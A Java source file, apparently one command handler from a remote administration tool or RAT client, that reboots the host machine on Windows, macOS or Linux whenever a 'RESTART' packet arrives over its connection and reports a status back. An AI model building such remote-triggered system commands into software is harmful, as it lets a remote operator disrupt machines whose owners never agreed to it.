package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Constants;
import com.redpois0n.common.OperatingSystem;

public class PacketRESTART extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -r");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
			Runtime.getRuntime().exec("shutdown -r now");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {
			
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
